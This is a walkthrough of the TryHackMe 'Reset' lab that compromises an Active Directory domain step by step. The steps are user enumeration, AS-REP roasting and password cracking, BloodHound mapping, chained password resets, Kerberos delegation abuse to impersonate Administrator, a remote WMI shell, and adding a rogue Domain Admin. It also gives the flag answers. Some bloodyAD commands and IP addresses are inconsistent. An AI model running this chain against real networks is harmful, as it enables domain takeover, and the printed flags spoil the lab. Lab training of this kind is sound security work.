**Reset | TryHackMe | Walkthrough**



**1. Initial Access**

**nmap -p- -v -sSCV --min-rate 1000 TARGET\_IP**

**-p- → Scan all ports (1–65535).**

**-v → Verbose mode, shows more details during the scan.**

**-sS → TCP SYN scan (fast and stealthy).**

**-sC → Run default Nmap scripts (basic service checks).**

**-sV (you wrote -V, but the correct flag is -sV) → Detect service versions.**

**--min-rate 1000 → Send packets at a minimum rate of 1000 per second (forces faster scanning).**

**Press enter or click to view image in full size**



**Add /etc/hosts**



**TARGET\_IP   HAYSTACK HAYSTACK.thm.corp thm.corp**

**2. Brute Force**

**nxc smb thm.corp -u guest -p '' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}' > valid-users.txt**

**nxc smb thm.corp -u guest -p '' --rid-brute Uses NetExec (nxc) to enumerate SMB users on the domain thm.corp with the username guest and an empty password. The --rid-brute option brute‑forces RIDs (Relative Identifiers) to list domain accounts — a common technique for discovering valid usernames when anonymous or guest access is allowed.**

**| grep "SidTypeUser" Filters the output to show only lines that contain SidTypeUser, which correspond to actual user accounts (not groups or computers).**

**| awk -F '\\\\' '{print $2}' Splits each line by the backslash (\\) and prints the second field — typically the username part of DOMAIN\\username.**

**| awk '{print $1}' Cleans up the output further, ensuring only the username itself is printed.**

**> valid-users.txt Saves the final list of usernames into a file named valid-users.txt.**

**Administrator**

**Guest**

**krbtgt**

**HAYSTACK$**

**3091731410SA**

**ERNESTO\_SILVA**

**TRACY\_CARVER**

**SHAWNA\_BRAY**

**CECILE\_WONG**

**CYRUS\_WHITEHEAD**

**DEANNE\_WASHINGTON**

**ELLIOT\_CHARLES**

**MICHEL\_ROBINSON**

**MITCHELL\_SHAW**

**FANNY\_ALLISON**

**JULIANNE\_HOWE**

**ROSLYN\_MATHIS**

**DANIEL\_CHRISTENSEN**

**MARCELINO\_BALLARD**

**CRUZ\_HALL**

**HOWARD\_PAGE**

**STEWART\_SANTANA**

**LINDSAY\_SCHULTZ**

**TABATHA\_BRITT**

**RICO\_PEARSON**

**DARLA\_WINTERS**

**ANDY\_BLACKWELL**

**LILY\_ONEILL**

**CHERYL\_MULLINS**

**LETHA\_MAYO**

**HORACE\_BOYLE**

**CHRISTINA\_MCCORMICK**

**3811465497SA**

**MORGAN\_SELLERS**

**MARION\_CLAY**

**3966486072SA**

**TED\_JACOBSON**

**AUGUSTA\_HAMILTON**

**TREVOR\_MELTON**

**LEANN\_LONG**

**RAQUEL\_BENSON**

**AUTOMATE**

**Press enter or click to view image in full size**



**42 valid domain users**

**3. AS-REP Roasting Impacket-GetNPUsers to retrieve data from Kerberos and Crack Password using John**

**impacket-GetNPUsers 'thm.corp/' -no-pass -usersfile valid-users.txt -outputfile asrep.hashes**

**impacket-GetNPUsers → A tool from the Impacket suite. It queries Kerberos for accounts that have “Do not require preauthentication” enabled. These accounts can be abused to request AS‑REP tickets without knowing the password.**

**'thm.corp/' → The target domain you’re enumerating (thm.corp).**

**-no-pass → Tells the tool not to use a password when making the request.**

**-usersfile valid-users.txt → Provides a list of usernames (from your earlier enumeration) to test against the domain.**

**-outputfile asrep.hashes → Saves any AS‑REP hashes that are returned into a file called asrep.hashes.**

**Press enter or click to view image in full size**



**john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hashes**

**Press enter or click to view image in full size**



**marlboro(1985)**

**4. Active Directory Mapping with BloodHound**

**bloodhound-python -u 'TABATHA\_BRITT' -p 'marlboro(1985)' -ns TARGET\_IP -d thm.corp --auth-method ntlm -c ALL**

**bloodhound-python → The data collector tool for BloodHound. It gathers information from Active Directory environments.**

**-u 'TABATHA\_BRITT' → Username used to authenticate.**

**-p 'marlboro(1985)' → Password for that user.**

**-ns TARGET\_IP → The IP address of the Domain Controller (or target server) you want to query.**

**-d thm.corp → The domain name (Active Directory domain).**

**--auth-method ntlm → Specifies the authentication method. Here it uses NTLM (Windows authentication protocol).**

**-c ALL → Tells BloodHound‑Python to collect all types of data (users, groups, computers, sessions, ACLs, trusts, etc.).**

**This command logs into the domain thm.corp using the credentials of user TABATHA\_BRITT, connects to the Domain Controller at TARGET\_IP, authenticates with NTLM, and collects all available Active Directory data. The output will be JSON/ZIP files that you can import into the BloodHound GUI for analysis.**



**Press enter or click to view image in full size**



**5. Reset Password**

**BloodHound shows that darla\_winters has delegation rights (AllowedToDelegate)**



**AllowedToDelegate → means the account darla\_winters can delegate authentication (Kerberos constrained delegation). This is often a privilege that can be abused for lateral movement or privilege escalation.**

**Chain reset → describes the path of accounts you can compromise/reset in sequence. Starting from tabatha\_britt, you pivot through shawna\_bray, then cruz\_hall, and finally reach darla\_winters.**

**Once you reach darla\_winters, because she has delegation rights, you can potentially escalate further (e.g., impersonate other users or access sensitive services).**

**bloodyAD --dc-ip 10.49.136.84 -d thm.corp -u 'tabatha\_britt' -p 'marlboro(1985)' set password shawna\_bray 'Kuyyai@1234'**

**bloodyAD --dc-ip 10.49.136.84 -d thm.corp -u 'shawna\_bray' -p 'Kuyyai@1234' set password shawna\_bray 'Kuyyai@1234'**

**bloodyAD --dc-ip 10.49.136.84 -d thm.corp -u 'cruz\_hall' -p 'Kuyyai@1234' set password shawna\_bray 'Kuyyai@1234'**

**bloodyAD → A tool used for Active Directory exploitation and management (similar to rpcclient or net user but with more attack‑focused features).**

**--dc-ip 10.49.139.140 → Specifies the Domain Controller’s IP address (here: 10.49.139.140).**

**-d thm.corp → The Active Directory domain name (thm.corp).**

**-u 'tabatha\_britt' → Username used to authenticate (tabatha\_britt).**

**-p 'mal' → Password for that user (mal).**

**set password shawna\_bray 'Kuyyai@1234' → The actual action: reset the password of user shawna\_bray to Kuyyai@1234.**

**Press enter or click to view image in full size**



**But you can use net rpc password command is part of the Samba suite and is used to remotely change a user’s password on a Windows/Active Directory system via RPC (Remote Procedure Call). It requires valid credentials from another account with permission to perform password changes**



**net rpc password "SHAWNA\_BRAY" "Kuyyai@1234" -U "thm.corp"/"TABATHA\_BRITT"%"marlboro(1985)" -S "10.49.184.185"**

**net rpc password "CRUZ\_HALL" "Kuyyai@1234" -U "thm.corp"/"SHAWNA\_BRAY"%"Kuyyai@1234" -S "10.49.184.185"**

**net rpc password "DARLA\_WINTERS" "Kuyyai@1234" -U "thm.corp"/"CRUZ\_HALL"%"Kuyyai@1234" -S "10.49.184.185"**

**Press enter or click to view image in full size**



**net rpc password "USERNAME" "NEW\_PASSWORD" → Sets the new password for the user account USERNAME.**

**-U "DOMAIN"/"ADMIN\_USER"%PASSWORD → Authenticates with the account ADMIN\_USER in the domain DOMAIN, using the given password.**

**-S TARGET\_IP → Specifies the target machine’s IP address where the password change should occur.**

**6. Abuse Resource-Based Constrained Delegation (S4U2Proxy)**

**Use getST.py to exploit the S4U2Self + S4U2Proxy functions to impersonate the Administrator user.**



**Become a Medium member**

**since darla\_winters is authorized to delegate to cifs/HAYSTACK**



**Request a Kerberos ticket for the Administrator**

**Save the ticket to a .ccache**

**impacket-getTGT thm.corp/DARLA\_WINTERS:Kuyyai@1234**

**impacket-getTGT → This tool requests a Kerberos Ticket Granting Ticket (TGT) from a domain controller.**

**thm.corp/DARLA\_WINTERS:Kuyyai@1234 → You are authenticating as the user DARLA\_WINTERS in the domain thm.corp, using the password Kuyyai@1234.**

**Press enter or click to view image in full size**



**3. Use that ticket to impersonate an Administrator via SMB (CIFS)**



**export KRB5CCNAME=$(pwd)/DARLA\_WINTERS.ccache**

**This sets the environment variable KRB5CCNAME to point to the Kerberos ticket cache file you previously generated (DARLA\_WINTERS.ccache).**

**By exporting it, you tell all Kerberos‑aware tools (like Impacket scripts) to use that cache file for authentication instead of prompting for a password.**

**impacket-getST -k -impersonate Administrator -spn cifs/haystack.thm.corp thm.corp/DARLA\_WINTERS**

**impacket-getST → Requests a Kerberos Service Ticket (ST) from the domain controller.**

**-k → Use Kerberos authentication (from the cache file you just exported).**

**-impersonate Administrator → Try to impersonate the Administrator account using S4U2Self/S4U2Proxy delegation.**

**-spn cifs/haystack.thm.corp → Ask for a service ticket to access the CIFS (file sharing) service on the machine haystack.thm.corp.**

**thm.corp/DARLA\_WINTERS → The account whose Kerberos ticket cache is being used (DARLA\_WINTERS in domain thm.corp).**

**Press enter or click to view image in full size**



**4. Spawns a semi‑interactive shell and executes commands remotely**



**export KRB5CCNAME=Administrator@cifs\_haystack.thm.corp@THM.CORP.ccache**

**This sets the Kerberos cache environment variable (KRB5CCNAME) to point to a specific cache file.**

**That cache file contains Kerberos tickets (in this case, one impersonating Administrator for the CIFS service on haystack.thm.corp).**

**By exporting it, you tell Kerberos‑aware tools to use that ticket file for authentication instead of asking for a password.**

**impacket-wmiexec -k administrator@haystack.thm.corp -no-pass**

**impacket-wmiexec → A tool that executes commands remotely on a Windows machine via WMI (Windows Management Instrumentation).**

**-k → Use Kerberos authentication (from the cache file you just set).**

**administrator@haystack.thm.corp → The account you’re trying to authenticate as (Administrator on the host haystack.thm.corp).**

**-no-pass → Don’t prompt for a password, because you’re relying on the Kerberos ticket cache instead.**

**Press enter or click to view image in full size**



**5. Run RDP as a Domain Admin and find anything we want**



**Add AD user PowerShell way (modern)**



**New-ADUser -Name "sornphut" -AccountPassword (ConvertTo-SecureString -AsPlainText 'Kuyyai@1234' -Force) -Enabled $true**

**Add-ADGroupMember -Identity "Domain Admins" -Members "sornphut"**

**Creates a new AD user sornphut with password Kuyyai@1234.**

**Adds that user into the Domain Admins group.**

**Legacy cmd.exe way**



**dsadd user "CN=Mishky,CN=Users,DC=thm,DC=corp" -samid sornphut -pwd Kuyyai@1234**

**net group "Domain Admins" sornphut /add /domain**

**Press enter or click to view image in full size**



**Use xfreerdp remote to Machine**



**xfreerdp3 /v:10.49.184.185 /u:sornphut /p:Kuyyai@1234 /dynamic-resolution** 

**xfreerdp3 → This is the FreeRDP client (version 3), used to connect to Windows machines via Remote Desktop Protocol (RDP).**

**/v:10.49.184.185 → Specifies the target machine’s IP address (10.49.184.185).**

**/u:sornphut → Sets the username to sornphut for login.**

**/p:Kuyyai@1234 → Provides the password Kuyyai@1234 for authentication.**

**/dynamic-resolution → Enables dynamic resolution, meaning the RDP window will automatically adjust its display resolution when you resize the window, instead of being locked to a fixed resolution.**

**Press enter or click to view image in full size**



**Get-ChildItem -Path "C:\\Users" -Recurse -Filter \*.txt | Get-Content**

**Get-ChildItem -Path "C:\\Users" → Lists all files and folders inside C:\\Users.**

**-Recurse → Goes through all subfolders as well, not just the top level.**

**-Filter \*.txt → Limits the search to files ending with .txt.**

**| Get-Content → Takes the list of .txt files found and reads their contents, displaying them in the console.**

**What is the user flag?**



**THM{AUTOMATION\_WILL\_REPLACE\_US}**

**What is the root flag?**



**THM{RE\_RE\_RE\_SET\_AND\_DELEGATE}**

